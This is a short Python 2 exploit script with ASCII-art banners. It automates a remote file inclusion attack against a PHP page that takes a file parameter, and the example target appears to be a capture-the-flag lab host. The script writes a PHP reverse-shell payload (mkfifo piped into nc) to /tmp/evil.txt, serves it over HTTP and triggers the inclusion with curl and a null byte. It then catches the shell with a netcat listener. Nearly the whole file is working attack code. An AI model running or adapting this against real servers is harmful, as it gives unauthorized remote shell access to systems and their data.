#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################################
#██▀███    █████▒██▓ ██▀███   ▄████▄  ▓█████                                                                                   #
#▓██ ▒ ██▒▓██   ▒▓██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀                                                                                  #
#▓██ ░▄█ ▒▒████ ░▒██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███                                                                                    #
#▒██▀▀█▄  ░▓█▒  ░░██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄                                                                                  #
#░██▓ ▒██▒░▒█░   ░██░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒                                                                                 #
#░ ▒▓ ░▒▓░ ▒ ░   ░▓  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░                                                                                 #
#░▒ ░ ▒░ ░      ▒ ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░                                                                                   #
#░░   ░  ░ ░    ▒ ░  ░░   ░ ░           ░                                                                                      #
#░             ░     ░     ░ ░         ░  ░                                                                                    #
#░                                                                                                                             #
#                                                                                                                              #
# DATE                                                                                                                         #
# 17/07/2018                                                                                                                   #
#                                                                                                                              #
# DESCRIPTION                                                                                                                  #
# Automates remote file inclusion attack                                                                                       #
#                                                                                                                              #
# nighter - http://nighter.se/                                                                                                 #
#                                                                                                                              #
################################################################################################################################

import signal
import os
import sys
import time


from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def build_payload():

    payload = '''<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f");?>''' % (LHOST, LPORT)

    with open('/tmp/evil.txt', 'w') as f:
        f.write(payload)


def HttpListener():

    os.chdir('/tmp')
    os.system('php -S 0.0.0.0:8000')
    print("[+] HTTP Listen = 8000")


def exploit():
    time.sleep(5)
    _payload = 'curl --insecure -s %s=http://%s:8000/evil.txt' % (HOST, LHOST)
    _payload += '%00'
    os.system(_payload)


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
 ██▀███    █████▒██▓ ██▀███   ▄████▄  ▓█████ 
▓██ ▒ ██▒▓██   ▒▓██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
▓██ ░▄█ ▒▒████ ░▒██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███   
▒██▀▀█▄  ░▓█▒  ░░██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
░██▓ ▒██▒░▒█░   ░██░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
░ ▒▓ ░▒▓░ ▒ ░   ░▓  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
  ░▒ ░ ▒░ ░      ▒ ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░
  ░░   ░  ░ ░    ▒ ░  ░░   ░ ░           ░   
   ░             ░     ░     ░ ░         ░  ░
                             ░               
    """)
        print("Usage: %s <HOST> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
        print("\nEXAMPLE: ./rfi_rce.py https://10.10.10.59/section.php?page 10.10.14.24 1337\n")
        sys.exit(0)

    HOST = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST = %s" % LHOST)

    build_payload()

    # Serve payload
    p = Process(target=HttpListener)
    p.start()

    # Exploit windows
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)